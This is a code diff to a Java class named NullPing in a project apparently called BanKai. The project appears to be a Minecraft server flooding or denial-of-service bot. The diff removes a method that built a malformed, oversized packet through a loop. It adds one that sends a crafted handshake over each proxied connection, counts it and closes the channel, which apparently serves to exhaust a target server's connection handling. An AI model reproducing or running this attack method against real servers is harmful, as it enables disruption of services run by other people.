@@ -1,48 +1,21 @@
 package dev.xdmeow.core.methods.impl;
 
-import java.io.IOException;
-
+import dev.xdmeow.BanKai;
 import dev.xdmeow.core.NettyBootstrap;
 import dev.xdmeow.core.methods.IMethod;
+import dev.xdmeow.core.util.mcutil.ext.Handshake;
 import dev.xdmeow.core.util.proxy.Proxy;
-import io.netty.buffer.ByteBuf;
-import io.netty.buffer.ByteBufOutputStream;
 import io.netty.buffer.Unpooled;
 import io.netty.channel.Channel;
 
 public class NullPing implements IMethod {
 
-        final int a = Integer.parseInt(System.getProperty("len", "25555"));
-    
+    private byte[] handshake = new Handshake(BanKai.protocol, BanKai.srvRecord, BanKai.port, 69).getWrappedPacket();
+
         public void accept(Channel channel, Proxy proxy) {
-            ByteBuf b = Unpooled.buffer();
-            
-            ByteBufOutputStream bbbb = new ByteBufOutputStream(b);
-            
-            try {
-                bbbb.write(15);
-                bbbb.write(0);
-                bbbb.write(47);
-                bbbb.write(911);
-                bbbb.write(99);
-                bbbb.write(200);
-                bbbb.write(10);
-                for (int i = 0; i < this.a; ++i) {
-                    bbbb.write(1);
-                    bbbb.write(0);
-                    bbbb.close();
-                }
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-            
-            channel.writeAndFlush(b);
-            
-            channel.writeAndFlush(bbbb);
-            
+            channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshake));
             ++NettyBootstrap.currentConnections;
             ++NettyBootstrap.totalConnections;
-
             channel.close();
         }
     }
